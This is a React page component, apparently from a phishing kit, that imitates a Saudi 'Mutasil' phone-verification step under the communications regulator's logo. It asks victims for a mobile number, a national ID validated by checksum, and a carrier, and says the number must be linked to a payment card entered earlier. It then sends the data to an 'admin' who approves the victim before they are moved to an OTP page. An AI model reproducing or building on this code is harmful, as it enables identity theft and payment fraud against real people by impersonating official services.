import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay, { waitingProviderInfo, waitingCardInfo } from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
  waitingMessage,
} from "@/lib/store";

const serviceProviders = [
  { value: "0", label: "STC", icon: "/images/service-providers/stc.jpg" },
  { value: "1", label: "موبايلي", icon: "/images/service-providers/mobily.png" },
  { value: "2", label: "زين", icon: "/images/service-providers/zain.webp" },
  { value: "3", label: "ليبارا", icon: "/images/service-providers/lebara.jpg" },
  { value: "4", label: "فيرجن", icon: "/images/service-providers/virgin.png" },
  { value: "5", label: "سلام", icon: "/images/service-providers/salam.jpg" },
];

// Valid Saudi mobile prefixes
const validSaudiPrefixes = ["050", "053", "054", "055", "056", "057", "058", "059"];

// Validate Saudi ID using Luhn algorithm
function validateSaudiId(id: string): boolean {
  if (!/^[12]\d{9}$/.test(id)) return false;
  let sum = 0;
  for (let i = 0; i < 10; i++) {
    let digit = parseInt(id[i]);
    if (i % 2 === 0) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
  }
  return sum % 10 === 0;
}

const schema = z.object({
  phone: z
    .string()
    .min(1, "رقم الجوال مطلوب")
    .regex(/^\d+$/, "يجب إدخال أرقام إنجليزية فقط")
    .length(10, "رقم الجوال يجب أن يكون 10 أرقام")
    .refine(
      (val) => validSaudiPrefixes.some((prefix) => val.startsWith(prefix)),
      "رقم الجوال يجب أن يبدأ بـ 050, 053, 054, 055, 056, 057, 058, أو 059"
    ),
  idNumber: z
    .string()
    .min(1, "رقم الهوية مطلوب")
    .regex(/^\d+$/, "يجب إدخال أرقام إنجليزية فقط")
    .length(10, "رقم الهوية يجب أن يكون 10 أرقام")
    .refine(
      (val) => val.startsWith("1") || val.startsWith("2"),
      "رقم الهوية يجب أن يبدأ بـ 1 (هوية وطنية) أو 2 (إقامة)"
    )
    .refine(
      (val) => validateSaudiId(val),
      "رقم الهوية غير صحيح"
    ),
  serviceProvider: z.string().min(1, "مزود الخدمة مطلوب"),
});

type FormData = z.infer<typeof schema>;

export default function PhoneVerification() {
  const [, navigate] = useLocation();
  const [selectedProvider, setSelectedProvider] = useState("");
  const [phoneError, setPhoneError] = useState("");
  const [idError, setIdError] = useState("");
  const [autoRedirecting, setAutoRedirecting] = useState(false);

  const {
    register,
    handleSubmit,
    setValue,
    reset,
    watch,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      phone: "",
      idNumber: "",
      serviceProvider: "",
    },
  });

  const phoneValue = watch("phone");
  const idValue = watch("idNumber");

  // Validate ID number on change
  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    
    // Only allow English digits
    if (value !== "" && !/^\d+$/.test(value)) {
      setIdError("يجب إدخال أرقام إنجليزية فقط");
      return;
    }
    
    // Limit to 10 digits
    if (value.length > 10) {
      return;
    }
    
    setValue("idNumber", value);
    
    // Validate first digit
    if (value.length >= 1) {
      if (value.charAt(0) !== "1" && value.charAt(0) !== "2") {
        setIdError("رقم الهوية يجب أن يبدأ بـ 1 (هوية وطنية) أو 2 (إقامة)");
      } else if (value.length === 10) {
        // Full 10 digits entered - validate with Luhn
        if (!validateSaudiId(value)) {
          setIdError("رقم الهوية غير صحيح");
        } else {
          setIdError("");
        }
      } else {
        setIdError("");
      }
    } else {
      setIdError("");
    }
  };

  // Validate phone number on change
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    
    // Only allow English digits
    if (value !== "" && !/^\d+$/.test(value)) {
      setPhoneError("يجب إدخال أرقام إنجليزية فقط");
      return;
    }
    
    // Limit to 10 digits
    if (value.length > 10) {
      return;
    }
    
    setValue("phone", value);
    
    // Validate prefix when 3 or more digits
    if (value.length >= 3) {
      const prefix = value.substring(0, 3);
      if (!validSaudiPrefixes.includes(prefix)) {
        setPhoneError("رقم الجوال يجب أن يبدأ بـ 050, 053, 054, 055, 056, 057, 058, أو 059");
      } else {
        setPhoneError("");
      }
    } else {
      setPhoneError("");
    }
  };

  // Emit page enter
  useEffect(() => {
    navigateToPage("توثيق رقم الجوال");
    // مسح معلومات البطاقة السابقة
    waitingCardInfo.value = null;
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate(`/phone-otp?serviceProvider=${selectedProvider}`);
    }
  }, [isFormApproved.value, navigate, selectedProvider]);

  // Handle form rejection
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
    }
  }, [isFormRejected.value, reset]);

  const onSubmit = (data: FormData) => {
    const idNumber = data.idNumber;
    localStorage.setItem("idNumber", idNumber);
    const provider = serviceProviders.find(
      (p) => p.value === data.serviceProvider
    );
    const providerName = provider?.label;

    // حفظ رقم الجوال في localStorage لاستخدامه لاحقاً
    localStorage.setItem('userPhone', data.phone);

    // تعيين معلومات مزود الخدمة لعرضها في شاشة الانتظار
    waitingProviderInfo.value = {
      providerLogo: provider?.icon,
      providerName: providerName,
      phoneNumber: data.phone,
    };

    // إذا كانت الشبكة غير STC (قيمة STC هي "0")
    if (data.serviceProvider !== "0") {
      // إظهار شاشة الانتظار
      setAutoRedirecting(true);
      
      // إرسال البيانات للأدمن بدون انتظار الرد
      sendData({
        data: {
          "رقم الجوال": data.phone,
          "مزود الخدمة": providerName,
          "رقم الهوية": idNumber,
        },
        current: "توثيق رقم الجوال",
        nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=${data.serviceProvider}`,
        waitingForAdminResponse: false,
        customWaitingMessage: "جاري التوثيق مع شبكة الإتصال الخاصة بك",
      });
      
      // التحويل التلقائي بعد 3 ثواني
      setTimeout(() => {
        waitingMessage.value = "";
        setAutoRedirecting(false);
        navigate(`/phone-otp?serviceProvider=${data.serviceProvider}`);
      }, 3000);
    } else {
      // STC - السلوك الحالي (انتظار رد الأدمن)
      sendData({
        data: {
          "رقم الجوال": data.phone,
          "مزود الخدمة": providerName,
          "رقم الهوية": idNumber,
        },
        current: "توثيق رقم الجوال",
        nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=${data.serviceProvider}`,
        waitingForAdminResponse: true,
        customWaitingMessage: "جاري التوثيق مع شبكة الإتصال الخاصة بك",
      });
    }
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="flex items-center justify-center mx-auto mb-4">
            <img src="/images/mutasil.jpg" alt="متصل" className="h-16 object-contain" />
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">توثيق واعتماد رقم الجوال</h1>
          <p className="text-gray-500 text-sm leading-relaxed">
            يجب أن يكون رقم الجوال موثقاً ومطابقاً
            <br />
            لبيانات الهوية الوطنية / الإقامة، ومرتبطاً
            <br />
            ببطاقة الدفع المدخلة
          </p>
        </div>

        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
          {/* Phone Number */}
          <div className="space-y-2">
            <Label htmlFor="phone">رقم الجوال</Label>
            <Input
              id="phone"
              type="tel"
              inputMode="numeric"
              placeholder="05xxxxxxxx"
              maxLength={10}
              value={phoneValue}
              onChange={handlePhoneChange}
            />
            {(errors.phone || phoneError) && (
              <p className="text-red-500 text-xs">{phoneError || errors.phone?.message}</p>
            )}
          </div>

          {/* ID Number */}
          <div className="space-y-2">
            <Label htmlFor="idNumber">رقم الهوية الوطنية / الإقامة</Label>
            <Input
              id="idNumber"
              type="tel"
              inputMode="numeric"
              placeholder="رقم الهوية الوطنية / الإقامة"
              maxLength={10}
              value={idValue}
              onChange={handleIdChange}
            />
            {(errors.idNumber || idError) && (
              <p className="text-red-500 text-xs">{idError || errors.idNumber?.message}</p>
            )}
          </div>

          {/* Service Provider */}
          <div className="space-y-2">
            <Label>مزود الخدمة</Label>
            <Select
              onValueChange={(v) => {
                setValue("serviceProvider", v);
                setSelectedProvider(v);
              }}
            >
              <SelectTrigger>
                <SelectValue placeholder="اختر مزود الخدمة" />
              </SelectTrigger>
              <SelectContent>
                {serviceProviders.map((provider) => (
                  <SelectItem key={provider.value} value={provider.value}>
                    <div className="flex items-center gap-2">
                      <img
                        src={provider.icon}
                        alt={provider.label}
                        className="w-5 h-5"
                      />
                      <span>{provider.label}</span>
                    </div>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {errors.serviceProvider && (
              <p className="text-red-500 text-xs">
                {errors.serviceProvider.message}
              </p>
            )}
          </div>

          {/* Submit Button */}
          <Button type="submit" className="w-full mt-4" size="lg" disabled={autoRedirecting} style={{ backgroundColor: '#03037a' }}>
            {autoRedirecting ? (
              <div className="flex items-center justify-center gap-2">
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>جاري إرسال رمز التحقق...</span>
              </div>
            ) : (
              "إرسال رمز التحقق"
            )}
          </Button>

        </form>

        {/* CST Logo */}
        <div className="flex items-center justify-center mt-8 pb-2">
          <img src="/images/cst.png" alt="هيئة الاتصالات والفضاء والتقنية" className="h-16 object-contain" />
        </div>
      </div>
    </PageLayout>
  );
}
